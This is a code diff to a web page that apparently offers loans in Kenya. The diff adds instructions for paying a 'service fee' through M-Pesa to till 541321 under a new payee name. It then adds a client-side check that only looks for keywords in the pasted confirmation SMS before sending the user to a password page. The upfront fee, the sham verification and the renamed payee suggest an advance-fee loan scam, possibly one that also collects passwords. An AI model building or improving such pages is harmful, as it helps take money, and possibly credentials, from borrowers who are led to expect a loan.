@@ -20,13 +20,26 @@
       <p><strong>Loan Amount:</strong> Ksh <span id="verifyLoan">...</span></p>
       <p><strong>Service Fee (6.4%):</strong> <span id="verifyFee">...</span></p>
       <p><strong>Pay Till Number:</strong> <span class="font-bold text-[#FF4E50]">541321</span></p>
-      <p class="text-xs text-gray-600">Use your M-Pesa to send exactly the above fee to this till number.</p>
+      <p class="text-xs text-gray-600">Use M-Pesa to send exactly the fee to the Till Number below. Message must include “HAKIKA R PROVISION”.</p>
+    </div>
+
+    <!-- Payment Instructions -->
+    <div class="text-left bg-white border border-red-200 p-4 rounded-xl mb-6">
+      <h2 class="text-sm font-bold text-[#FF4E50] mb-2">💳 How to Pay via M-Pesa (Buy Goods & Services)</h2>
+      <ol class="text-sm list-decimal list-inside space-y-1 text-gray-700">
+        <li>Go to your M-Pesa menu</li>
+        <li>Select <strong>Buy Goods and Services</strong></li>
+        <li>Enter Till Number: <strong>541321</strong></li>
+        <li>Enter Amount: <strong><span id="guideFee">...</span></strong></li>
+        <li>Enter your M-Pesa PIN and press OK</li>
+        <li>You will receive an SMS from Safaricom with the confirmation</li>
+      </ol>
     </div>
 
     <!-- Mpesa Code Input -->
     <div class="mb-4 text-left">
       <label for="mpesaText" class="block text-sm font-medium mb-1">Paste M-Pesa Confirmation Message</label>
-      <textarea id="mpesaText" rows="3" placeholder="Example: QHG4RT8Y Confirmed. Ksh120 sent to Zash Loan Till 541321..."
+      <textarea id="mpesaText" rows="3" placeholder="e.g., QHG4RT8Y Confirmed. Ksh120 sent to HAKIKA R PROVISION Till 541321..."
         class="w-full p-3 rounded-xl border border-gray-300 focus:outline-none focus:ring-2 focus:ring-[#FF4E50] text-sm"></textarea>
     </div>
 
@@ -41,23 +54,34 @@
     const name = localStorage.getItem("fullName") || "User";
     const loan = localStorage.getItem("loanAmount") || "0";
     const fee = localStorage.getItem("processingFee") || "0";
+    const feeInt = parseInt(fee);
 
     document.getElementById("verifyName").textContent = name;
     document.getElementById("verifyLoan").textContent = parseInt(loan).toLocaleString();
-    document.getElementById("verifyFee").textContent = "Ksh " + parseInt(fee).toLocaleString();
+    document.getElementById("verifyFee").textContent = "Ksh " + feeInt.toLocaleString();
+    document.getElementById("guideFee").textContent = "Ksh " + feeInt.toLocaleString();
 
     function submitMpesaMessage() {
-      const mpesaText = document.getElementById("mpesaText").value.trim();
-
-      if (mpesaText.length < 10) {
+      const message = document.getElementById("mpesaText").value.trim().toUpperCase();
+      
+      if (message.length < 20) {
         alert("Please paste a valid M-Pesa confirmation message.");
         return;
       }
 
-      // Store message in localStorage if needed later
-      localStorage.setItem("mpesaMessage", mpesaText);
+      const hasKeyword = message.includes("HAKIKA R PROVISION");
+      const hasAmount = message.includes("KSH" + feeInt) || message.includes("KSH " + feeInt);
+      const hasTill = message.includes("541321");
 
-      // Proceed to password screen
+      if (!hasKeyword || !hasAmount || !hasTill) {
+        alert("❌ Your message must contain:\n- HAKIKA R PROVISION\n- Correct fee: Ksh " + feeInt + "\n- Till Number: 541321");
+        return;
+      }
+
+      // Store confirmation for next page
+      localStorage.setItem("mpesaMessage", message);
+
+      // Proceed
       window.location.href = "password.html";
     }
   </script>
